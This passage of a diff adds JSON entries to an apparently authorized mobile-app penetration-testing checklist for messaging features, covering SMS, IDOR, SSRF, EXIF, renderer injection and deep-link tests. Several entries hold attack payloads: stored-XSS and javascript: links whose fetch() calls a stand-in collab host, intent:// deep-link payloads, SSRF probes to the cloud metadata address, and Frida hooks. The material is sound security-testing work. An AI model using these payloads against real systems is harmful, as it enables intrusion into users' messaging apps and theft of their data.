+   "how": "```bash\ngrep -rnE 'content://sms|Telephony\\.Sms|SMS_RECEIVED|getMessagesFromIntent' \"$DEC/jadx/sources\" | head\ncat > \"$E/frida/d24-034.js\" <<'JS'\nJava.perform(function () {\n  var CR = Java.use('android.content.ContentResolver');\n  CR.query.overload('android.net.Uri','[Ljava.lang.String;','java.lang.String','[Ljava.lang.String;','java.lang.String').implementation = function (u, p, s, a, o) {\n    if (u.toString().indexOf('sms') >= 0) console.log('[D24-034] query ' + u + ' sel=' + s + ' proj=' + (p ? Java.use('java.util.Arrays').toString(p) : null));\n    return this.query(u, p, s, a, o);\n  };\n});\nJS\nfrida -D \"$SERIAL\" -n \"$PKG\" -l \"$E/frida/d24-034.js\" -q -t 300 | tee \"$E/logs/D24-034.txt\" &\n# plant a canary SMS on the lab device from your own number (\"d24-034 canary 5519\"), drive the OTP flow, then grep the proxy for the canary\n```",
+   "proof": "A query with no sender/time selection (or a sync route) and the canary from an unrelated SMS\nin the proxy or in the app's database.",
+   "escalation": "→ D13-048 (the OTP channels); → D20 for the data-collection declaration (MASWE-0073).",
+   "ruled_out_when": "Every SMS query is bounded to the sender and a time window (hook output), nothing\nSMS-derived leaves the device for the canary, and the receiver drops non-matching bodies (file:line)."
+  },
+  {
+   "id": "D24-035",
+   "domain": "D24",
+   "title": "RCS and business-messaging integration — capability discovery as number enumeration, sender identity from the client",
+   "severity": "medium",
+   "severity_floor": "medium",
+   "severity_note": "Medium",
+   "vrt": "`broken_access_control.username_enumeration.non_brute_force` (P4) for the presence oracle; `server_side_injection.content_spoofing.external_authentication_injection` (P4) when the client chooses the verified sender",
+   "vrt_priority": "P4",
+   "vrt_best": "P4",
+   "attacker": "AM-05 / AM-01",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Apps that query RCS capabilities (`ImsRcsManager`, `RcsUceAdapter`) or use a business-messaging backend that stamps a verified sender; verify the carrier and platform API names on the installed build before citing them",
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
+   "maps_to": "CWE-200; CWE-346; ATT&CK T1437.001",
+   "record": "`logs/D24-035.txt` (the counted sweep); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-200",
+     "CWE-346"
+    ],
+    "attack": [
+     "T1437.001"
+    ],
+    "vrt": [
+     "broken_access_control.username_enumeration.non_brute_force",
+     "server_side_injection.content_spoofing.external_authentication_injection"
+    ]
+   },
+   "xrefs": [
+    "D13-047",
+    "D13-052",
+    "D24-005",
+    "D24-011"
+   ],
+   "domain_refs": [
+    "D13"
+   ],
+   "has_code": false,
+   "skip_when": "`grep -rlE 'ImsRcsManager|RcsUceAdapter|capabilit(y|ies)' \"$DEC/jadx/sources\" | wc -l` = 0 and no business-messaging route is in the endpoint map — write `n/a — D24-035: no RCS or business-messaging integration`.",
+   "test": "Two halves. (a) A capability or presence lookup that answers for arbitrary numbers tells the\ncaller which numbers are live users — an enumeration oracle keyed on phone number. (b) A business-\nmessaging send whose sender identity, display name or \"verified\" badge is a client-supplied field lets\none tenant message as another.",
+   "how": "Capture the capability lookup and the send; replay the lookup for a bounded list of numbers\nyou own plus one known-unused (count printed, D24-005) and diff the answers; replay the send with the\nsender fields swapped to a second tenant you own.",
+   "proof": "Per-number presence returned without a relationship or rate limit; or a message delivered\nunder a sender identity the caller does not own.",
+   "escalation": "→ D13-047 / D13-052 for the phone-number recovery chain; → D24-011 for the delivery\nclause.",
+   "ruled_out_when": "Lookups are limited to the caller's own contacts with a server-side relationship\ncheck (diff is empty for the unused number) and the sender identity is derived from the tenant's\ncredential, not the body (swap ignored — body diff)."
+  },
+  {
+   "id": "D24-036",
+   "domain": "D24",
+   "title": "Message-object IDOR matrix — message, attachment, reaction, mention, poll, call log across fetch, edit, delete and forward",
+   "severity": "critical",
+   "severity_floor": "critical",
+   "severity_note": "Critical",
+   "vrt": "`broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1); `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) when the id is an unleaked v4 UUID (D15-039 lifts it)",
+   "vrt_priority": "P1",
+   "vrt_best": "P1",
+   "attacker": "AM-05",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Every app with user-to-user messaging, comments, support chat or shared inboxes. Support-ticket objects are D15-049; this item owns the chat matrix.",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-639; CWE-862; D15-049, D15-039, D15-058",
+   "record": "`logs/D24-036.txt` (the matrix with one line per cell); `requests/E-NNN.http` per confirmed cell",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-639",
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_view_sensitive_information_guid",
+     "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D15-039",
+    "D15-049",
+    "D15-058",
+    "D24-005",
+    "D24-016",
+    "D24-037",
+    "D24-044"
+   ],
+   "domain_refs": [
+    "D15"
+   ],
+   "has_code": false,
+   "skip_when": "`grep -ciE 'message|conversation|chat|attachment' inventory/endpoints.csv` prints 0 after the P3 gate — write `n/a — D24-036: no messaging objects in the endpoint map`; with no account B, write `blocked — D24-036: needs account B` instead.",
+   "test": "Run it as a table, not a tour: rows = object types (conversation, message, attachment,\nreaction, mention, poll / vote, voice note, call log, read receipt), columns = verbs (fetch, edit,\ndelete, forward, report, pin). Each cell: B's id with A's session. The cells that fail most often are the\nones with their own id space — attachments, reactions and polls — because the conversation check was\nwritten for the conversation.",
+   "how": "From the endpoint map, take every route with a message-class id; with two accounts you own,\ncreate one object of each type in B's conversation (with a third account you own as the peer), then\nissue each verb with A's session and B's id. Python, counted (D24-005), body diff per cell.",
+   "proof": "B's object content returned, changed or removed by A — the body diff and the two requests\nper cell.",
+   "escalation": "→ D24-037 (attachment URLs), → D24-044 (delete-for-everyone), → D24-016 when a push\nmakes the victim's client perform the same call.",
+   "ruled_out_when": "Every cell returns the same response for B's id as for a random id (scoped lookup,\ndiff empty), with the matrix recorded in full — a half-run matrix is `untested`, not negative."
+  },
+  {
+   "id": "D24-037",
+   "domain": "D24",
+   "title": "Attachment and media URLs unauthenticated, unexpiring or surviving deletion",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the object key is guessable",
+   "vrt_priority": "varies",
+   "vrt_best": "P3",
+   "attacker": "AM-01 (anyone with the URL) / AM-05",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Messaging, support and sharing features that serve attachments from a CDN or object store",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-639; CWE-613; D15-053 (share-token reuse), D24-044",
+   "record": "`logs/D24-037.txt`; `requests/E-NNN.http` (the curl without a session, the re-fetch after deletion)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-613",
+     "CWE-639"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers",
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D15-053",
+    "D24-002",
+    "D24-005",
+    "D24-038",
+    "D24-044"
+   ],
+   "domain_refs": [
+    "D15"
+   ],
+   "has_code": true,
+   "skip_when": "no attachment or media route in the endpoint map and no media URL in any captured message — write `n/a — D24-037: messaging carries no attachments`.",
+   "test": "Three fetches settle it: the attachment URL from `curl` with no session; the same URL a day\nlater or after the signed expiry; the same URL after the message is deleted. A URL that is a bare\nobject key (no signature, no expiry) is readable by anyone who ever saw it — forwarded, screenshotted,\nlogged by a proxy, or guessed.",
+   "how": "```bash\ngrep -oE 'https?://[^\" ]+(\\.(jpg|png|mp4|pdf|aac|ogg)|/attachments?/)[^\" ]*' \"$E/logs/D24-002.txt\" \"$E/requests/\"*.http 2>/dev/null | sort -u | head\n# for one URL you own: curl -s -o /dev/null -w '%{http_code}\\n' '<url>'  (no cookie, no header)  — then delete the message in-app and repeat; then wait past the stated expiry and repeat\n```",
+   "proof": "`200` and the bytes with no session, after deletion, or after expiry; a sequential or\nshort object key makes it the IDOR variant (count the sweep, D24-005).",
+   "escalation": "→ D24-044 when \"delete for everyone\" leaves the media; → D24-038 when a preview fetcher\ncan be pointed at it; → D15-053 for share tokens.",
+   "ruled_out_when": "URLs are signed with a short expiry and a session-bound fetch (the no-session curl\nreturns 403 with the same body as a random key; the post-expiry fetch fails; deletion invalidates within\nthe stated window — all three recorded)."
+  },
+  {
+   "id": "D24-038",
+   "domain": "D24",
+   "title": "Link previews — on-device fetches leak the recipient; server-side fetchers are SSRF",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High for the server-side fetcher reaching internal addresses; Medium for the recipient-IP leak",
+   "vrt": "`server_security_misconfiguration.server_side_request_forgery_ssrf.internal_data_exposure` (P3) — up to `.internal_secrets_exposure` (P2) on a cloud metadata hit; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the on-device fetch that exposes the recipient's IP and user agent to a sender's host",
+   "vrt_priority": "P3",
+   "vrt_best": "P3",
+   "attacker": "AM-05 — one message with a link",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Messaging features that render link previews or unfurl URLs",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-918; CWE-200; MASWE-0050",
+   "record": "`logs/D24-038.txt` (the collab-host request log: source IP, UA, timing); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-200",
+     "CWE-918"
+    ],
+    "attack": [],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure",
+     "server_security_misconfiguration.server_side_request_forgery_ssrf.internal_data_exposure"
+    ]
+   },
+   "xrefs": [
+    "D24-040"
+   ],
+   "domain_refs": [
+    "D15"
+   ],
+   "has_code": true,
+   "skip_when": "sending a canary URL from A to B produces no preview in B's client and no fetch at the collab host within ten minutes — write `n/a — D24-038: no link previews (canary unfetched)`.",
+   "test": "Send a canary URL from A to B and watch the collab host. A request from B's IP with the\napp's user agent before B taps is an on-device fetch that de-anonymises the recipient and parses\nattacker HTML in-app; a request from the vendor's range is a server-side fetcher — point it at\n`http://127.0.0.1`, an internal hostname and the cloud metadata address and read what the preview\nreturns.",
+   "how": "```bash\n# A → B: message containing https://zq7x4mk9.collab.example/d24-038-<nonce> ; record who fetched it and when (before any tap)\n# server-side: send http://169.254.169.254/latest/meta-data/ , http://127.0.0.1:80/ , http://<internal-name>/ and read the preview title/description/image fields in the API response\ngrep -rnE 'OpenGraph|og:title|unfurl|linkPreview|Jsoup|readability' \"$DEC/jadx/sources\" | head   # on-device parser present?\n```",
+   "proof": "The collab-host log line with the fetching IP and UA; for the server side, preview fields\ncontaining bytes from an internal address.",
+   "escalation": "→ D15 for the SSRF write-up (the preview route is the entry); → D24-040 when the\non-device parser renders the fetched HTML.",
+   "ruled_out_when": "Previews are generated by the sender's client only (the collab host sees A, never B\nand never a vendor IP) and the on-device renderer takes text fields only (file:line)."
+  },
+  {
+   "id": "D24-039",
+   "domain": "D24",
+   "title": "Media auto-download into shared storage readable by other apps, EXIF intact",
+   "severity": "medium",
+   "severity_floor": "medium",
+   "severity_note": "Medium",
+   "vrt": "`insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4); `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.manual_user_enumeration` (P4) for location metadata that survives the pipeline",
+   "vrt_priority": "P4",
+   "vrt_best": "P4",
+   "attacker": "AM-04 — an app holding `READ_MEDIA_IMAGES` / `READ_MEDIA_VIDEO`; AM-05 for the EXIF half (the sender's location reaches the recipient)",
+   "attacker_ids": [
+    "AM-04",
+    "AM-05"
+   ],
+   "applies_to": "Messaging apps that save received media to `Pictures/`, `Download/` or `DCIM/` via MediaStore or legacy external paths",
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
+   "maps_to": "MASTG-TEST-0200; MASWE-0002; MASWE-0069; D11-044, D11-045 (MediaStore columns and insert control), D20-002 (markers)",
+   "record": "`logs/D24-039.txt` (`exiftool` / `identify` output and the probe's read); `screenshots/D24-039-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0200"
+    ],
+    "maswe": [
+     "MASWE-0002",
+     "MASWE-0069"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage",
+     "sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.manual_user_enumeration"
+    ]
+   },
+   "xrefs": [
+    "D11-044",
+    "D11-045",
+    "D20-002",
+    "D24-015"
+   ],
+   "domain_refs": [
+    "D11",
+    "D16",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'MediaStore\\.(Images|Video|Downloads)|getExternalStoragePublicDirectory' \"$DEC/jadx/sources\" | wc -l` = 0 and the shared collections show nothing after a received-media trial — write `n/a — D24-039: received media stays app-private`.",
+   "test": "Received media written to shared storage is readable by any app with the media permission —\nthe attachment the sender meant for one person is now in every gallery-reading app's reach — and media\nthat keeps EXIF GPS carries the sender's location to the recipient (and to those apps). Two trials:\nreceive an image with a canary GPS tag; read it back from a second app.",
+   "how": "```bash\ngrep -rnE 'MediaStore\\.(Images|Video|Downloads)|RELATIVE_PATH|getExternalStoragePublicDirectory|DIRECTORY_PICTURES' \"$DEC/jadx/sources\" | head\n# send from B an image carrying EXIF GPS (set with exiftool on the host) to A; then on A's device:\nadb -s \"$SERIAL\" shell \"ls -la /sdcard/Pictures/ /sdcard/Download/ 2>/dev/null | grep -i '$(date +%Y)'\" | tee \"$E/logs/D24-039.txt\"\nadb -s \"$SERIAL\" pull '/sdcard/Pictures/<app folder>/<file>' /tmp/d24-039.jpg && exiftool /tmp/d24-039.jpg | grep -i gps | tee -a \"$E/logs/D24-039.txt\"\n```",
+   "proof": "The file under a shared collection with the GPS tag intact, read back by a second app you own\nholding only the media permission.",
+   "escalation": "→ D11-045 when the sender controls the filename or subdirectory; → D16 when the\nauto-download decodes the file without a tap (D24-015 pattern).",
+   "ruled_out_when": "Received media stays under the app's private directory until the user exports it\n(file:line; the shared collections show nothing after the trial), and the upload path strips EXIF\n(the pulled file has no GPS tag)."
+  },
+  {
+   "id": "D24-040",
+   "domain": "D24",
+   "title": "Received-message rendering — markdown, HTML and mention injection into a WebView or `Html.fromHtml` with `javascript:` / `intent:` links",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "High; Critical with a bridge or the session in the rendering WebView",
+   "vrt": "`cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) when script runs; `server_side_injection.content_spoofing.html_content_injection` (P5) when only markup renders",
+   "vrt_priority": "P2",
+   "vrt_best": "P2",
+   "attacker": "AM-05 — one message",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Messaging, comment and support features whose renderer is a WebView, `Html.fromHtml`, a markdown library with raw-HTML enabled, or a rich-text span builder that makes links clickable",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-79; MASWE-0035; MASWE-0050; MASTG-TEST-0398; MASTG-KNOW-0018",
+   "record": "`logs/D24-040.txt`; `screenshots/D24-040-1.png` (the rendered payload on B's device); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-KNOW-0018",
+     "MASTG-TEST-0398"
+    ],
+    "maswe": [
+     "MASWE-0035",
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-79"
+    ],
+    "attack": [],
+    "vrt": [
+     "cross_site_scripting_xss.stored.non_admin_to_anyone",
+     "server_side_injection.content_spoofing.html_content_injection"
+    ]
+   },
+   "xrefs": [
+    "D10-004",
+    "D24-041"
+   ],
+   "domain_refs": [
+    "D09",
+    "D10"
+   ],
+   "has_code": true,
+   "skip_when": "the message renderer is a plain `TextView` path with no HTML, markdown or `Linkify` call (`grep -rlE 'Html\\.fromHtml\\(|Markwon|commonmark|Linkify' \"$DEC/jadx/sources\" | wc -l` = 0) — write `n/a — D24-040: plain-text rendering (file:line)`.",
+   "test": "The sender's bytes are rendered in the recipient's process. Find the renderer, then send the\npayloads that match it: `<img onerror>` and `<a href=\"javascript:\">` for a WebView; `<a\nhref=\"intent://…\">` and `<a href=\"targetapp://…\">` for `Html.fromHtml` with `Linkify` (a tap on a\nstyled link is the D09 payload); a mention token that resolves to a display name you control.",
+   "how": "```bash\ngrep -rnE 'Html\\.fromHtml\\(|Markwon|commonmark|Linkify|setMovementMethod|loadDataWithBaseURL\\(' \"$DEC/jadx/sources\" | grep -iE 'message|chat|comment|bubble' | head\n# A → B payloads (one per message, counted): <img src=x onerror=\"fetch('https://zq7x4mk9.collab.example/xss')\">  ·  <a href=\"javascript:fetch('https://zq7x4mk9.collab.example/js')\">tap</a>  ·  [tap](intent://x#Intent;scheme=targetapp;package=$PKG;end)\n```",
+   "proof": "The collab host hit from B's device without a tap (script), or the D09 route opened on tap\nfrom a message link; the message request that carried it.",
+   "escalation": "→ D10-004 (bridge in the rendering WebView), → D24-041 (auto-handled links), → D09\nfor the route reached.",
+   "ruled_out_when": "Messages render as plain text (file:line of the `TextView` path with no HTML\nparsing), or the renderer strips tags and schemes server-side (the payload comes back escaped in the API\nresponse — body shown)."
+  },
+  {
+   "id": "D24-041",
+   "domain": "D24",
+   "title": "Received-message links auto-handled as deep links — `intent://`, custom schemes, no confirmation",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High — one message is a D09 payload",
+   "vrt": "rated on the route reached — the D09 / D10 node of the sink",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-05 (a message) — stronger than AM-02 because no browser is involved",
+   "attacker_ids": [
+    "AM-02",
+    "AM-05"
+   ],
+   "applies_to": "Messaging features whose link handler resolves `intent:` URIs or the app's own schemes, or opens links in the in-app WebView",
+   "requires": "deeplink, device",
+   "requires_tags": [
+    "deeplink",
+    "device"
+   ],
+   "maps_to": "MASWE-0029; MASTG-TEST-0394; MASTG-KNOW-0138; D09-063 (`file://` / `content://` into a reading sink), D24-040",
+   "record": "`logs/D24-041.txt` (frida/03 trace of the route taken); `screenshots/D24-041-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-KNOW-0138",
+     "MASTG-TEST-0394"
+    ],
+    "maswe": [
+     "MASWE-0029"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D09-063",
+    "D10-004",
+    "D24-040"
+   ],
+   "domain_refs": [
+    "D09",
+    "D10"
+   ],
+   "has_code": true,
+   "skip_when": "`inventory/deeplinks.csv` is empty and links open in the system browser (trace shows `ACTION_VIEW` to the browser for one canary link) — write `n/a — D24-041: no in-app link handling`.",
+   "test": "A link in a chat bubble is tapped with far more trust than a link in a browser. If the tap\nhandler parses `intent://` URIs, routes the app's own scheme without the browser path's allow-list, or\nopens the URL in the session WebView, every D09 finding becomes \"send one message\".",
+   "how": "```bash\ngrep -rnE 'parseUri\\(|shouldOverrideUrlLoading|onLinkClick|URLSpan|CustomTabsIntent' \"$DEC/jadx/sources\" | grep -iE 'message|chat|link' | head\nfrida -D \"$SERIAL\" -n \"$PKG\" -l frida/03-deeplink-trace.js -q -t 300 | tee \"$E/logs/D24-041.txt\" &\n# A → B: targetapp://web?url=https://zq7x4mk9.collab.example/  and  intent://x#Intent;scheme=targetapp;package=$PKG;S.url=https://zq7x4mk9.collab.example/;end  — tap on B's device\n```",
+   "proof": "The trace shows the route handled in-app (not handed to the system browser) and the collab\nhost hit from the app's WebView or the activity started.",
+   "escalation": "→ D09 route items and D10-004; → D09-063 when the link is `file://` or `content://`.",
+   "ruled_out_when": "Links open in the system browser or a Custom Tab with no scheme special-casing\n(file:line; the trace shows `ACTION_VIEW` to the browser), and `intent:` is refused."
+  },
+  {
+   "id": "D24-042",
+   "domain": "D24",
+   "title": "Group membership and admin checks enforced client-side; join links reused after revocation",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High",
+   "vrt": "`broken_access_control.privilege_escalation` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for the add/remove by id",
+   "vrt_priority": "varies",
+   "vrt_best": "P2",
+   "attacker": "AM-05 — a non-admin member or an ex-member",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Group, channel, room and shared-inbox features",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-862; CWE-863; D15-053 (invite-token reuse)",
+   "record": "`logs/D24-042.txt` (the verb × role table); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862",
+     "CWE-863"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.privilege_escalation"
+    ]
+   },
+   "xrefs": [
+    "D15-053",
+    "D24-036",
+    "D24-044"
+   ],
+   "domain_refs": [
+    "D15"
+   ],
+   "has_code": false,
+   "skip_when": "the product has no group, channel or room feature in the endpoint map — write `n/a — D24-042: no group feature`.",
+   "test": "With A as admin and B as member (plus a third account you own), replay every admin verb\n(add, remove, promote, rename, change settings, delete group, read history before join) from B's\nsession; then remove B and replay the member verbs (read, send, react); then use a revoked join link.",
+   "how": "Capture each verb as A; replay with B's session; record status and body diff per verb;\nrevoke the invite link as A and open it as the third account.",
+   "proof": "A state change or content read with the wrong role, or a join through a revoked link.",
+   "escalation": "→ D24-036 when an ex-member can still fetch message ids; → D24-044 for retained\ncontent.",
+   "ruled_out_when": "Every admin verb from B returns a refusal whose body matches a random-group\nrequest, an ex-member's reads return nothing (diff), and revoked links are rejected."
+  },
+  {
+   "id": "D24-043",
+   "domain": "D24",
+   "title": "End-to-end-encryption claims — key-change warnings suppressed, no verification path, plaintext history in a backup",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "Medium; High when the \"E2EE\" history is readable in a cloud or device backup",
+   "vrt": "`mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5) for the backup half alone — argue to `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) with the plaintext shown",
+   "vrt_priority": "P5",
+   "vrt_best": "P4",
+   "attacker": "AM-09 (the server, for silent key rotation) / AM-11 and AM-10 (the backup set)",
+   "attacker_ids": [
+    "AM-09",
+    "AM-10",
+    "AM-11"
+   ],
+   "applies_to": "Apps that advertise end-to-end encryption for messages or calls",
+   "requires": "two-accounts, device",
+   "requires_tags": [
+    "two-accounts",
+    "device"
+   ],
+   "maps_to": "MASWE-0006; MASTG-TEST-0216; MASTG-TECH-0127; CWE-311; D11-055 (the second plaintext copy)",
+   "record": "`logs/D24-043.txt` (key-change trial; backup listing); `screenshots/D24-043-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TECH-0127",
+     "MASTG-TEST-0216"
+    ],
+    "maswe": [
+     "MASWE-0006"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-311"
+    ],
+    "attack": [],
+    "vrt": [
+     "insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage",
+     "mobile_security_misconfiguration.auto_backup_allowed_by_default",
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D11-055"
+   ],
+   "domain_refs": [
+    "D11",
+    "D12",
+    "D22"
+   ],
+   "has_code": true,
+   "skip_when": "the product makes no end-to-end-encryption claim (store listing, in-app copy, docs) — write `n/a — D24-043: no E2EE claim to test`; the backup half is then D11-055 / D22 only.",
+   "test": "Three questions a marketing claim must survive. (a) When B's key changes (reinstall as B),\ndoes A's client warn, or silently accept the new key the server presented? (b) Is there a user-visible\nverification (safety number, QR) and does it change? (c) Does the message store, or the app's own\nbackup, hold the plaintext history where the backup rules or a cloud export expose it?",
+   "how": "```bash\ngrep -rnE 'safety|fingerprint|identityKey|prekey|X3DH|Signal|libsignal|olm|megolm' \"$DEC/jadx/sources\" | head\ngrep -B2 -A6 'allowBackup\\|fullBackupContent\\|dataExtractionRules' \"$DEC/apktool/AndroidManifest.xml\"; ls \"$DEC/apktool/res/xml/\" | grep -iE 'backup|extraction'\n# reinstall the app as B (new identity key); send from A; record whether A was warned before the message left\n# backup half: tools/05-storage-sweep.sh \"$PKG\" --backup --serial \"$SERIAL\"  then grep the set for a canary message\n```",
+   "proof": "A's client sending to the rotated key with no warning (screenshot + the trace), or the\ncanary message in plaintext inside the backup set or export.",
+   "escalation": "→ D11-055 / D22 for the backup rules; → D12 when the key material itself is\nrecoverable.",
+   "ruled_out_when": "The key change blocks sending until acknowledged (trial recorded), a verification\nsurface exists and changes with the key, and the backup set excludes the message store (the canary is\nabsent — listing shown)."
+  },
+  {
+   "id": "D24-044",
+   "domain": "D24",
+   "title": "\"Delete for everyone\" and message edit not enforced server-side — recipients keep content, media stays at the CDN",
+   "severity": "medium",
+   "severity_floor": "medium",
+   "severity_note": "Medium",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the deleted object is still fetchable by id; otherwise rated with the product's stated guarantee (`varies`)",
+   "vrt_priority": "P3",
+   "vrt_best": "P3",
+   "attacker": "AM-05 — the recipient, or anyone with the attachment URL",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Messaging features offering unsend, delete-for-everyone, edit or disappearing messages",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-613; D24-037, D24-036",
+   "record": "`logs/D24-044.txt`; `requests/E-NNN.http` (the re-fetch after deletion)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-613"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D24-036",
+    "D24-037"
+   ],
+   "domain_refs": [],
+   "has_code": false,
+   "skip_when": "the product offers no unsend, delete-for-everyone, edit or disappearing-message feature — write `n/a — D24-044: no retraction feature`.",
+   "test": "The guarantee is server-side or it is a client hint. After A deletes-for-everyone or edits,\nre-fetch the message by id with B's session and re-fetch the attachment URL; for disappearing messages,\nfetch after the timer. A `200` with the original bytes is the finding.",
+   "how": "Capture the fetch routes as B; A sends, A deletes / edits / lets expire; B replays the fetch\nand the media URL; diff the bodies against the pre-deletion capture.",
+   "proof": "The original content returned after the deletion, edit or expiry, with timestamps.",
+   "escalation": "→ D24-037 for the media half; → D24-036 when any id works, not only B's.",
+   "ruled_out_when": "The post-deletion fetch returns a tombstone (diff shown) and the media URL fails\nwithin the stated window; disappearing messages are absent from the API after expiry."
+  },
+  {
+   "id": "D24-045",
+   "domain": "D24",
+   "title": "Presence, typing, read-receipt and last-seen endpoints leak activity to blocked or unrelated users",
+   "severity": "medium",
+   "severity_floor": "medium",
+   "severity_note": "Medium",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_access_control.username_enumeration.non_brute_force` (P4) for the existence oracle",
+   "vrt_priority": "varies",
+   "vrt_best": "P4",
+   "attacker": "AM-05 — a blocked user or a stranger",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Messaging features with online status, typing indicators, read receipts or last-seen",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-200; CWE-862; D24-048 (realtime channels)",
+   "record": "`logs/D24-045.txt` (the polled answers over time); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-200",
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.username_enumeration.non_brute_force",
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D24-048",
+    "D24-049"
+   ],
+   "domain_refs": [],
+   "has_code": false,
+   "skip_when": "the product exposes no presence, typing, read-receipt or last-seen signal in the UI or the API — write `n/a — D24-045: no activity signals`.",
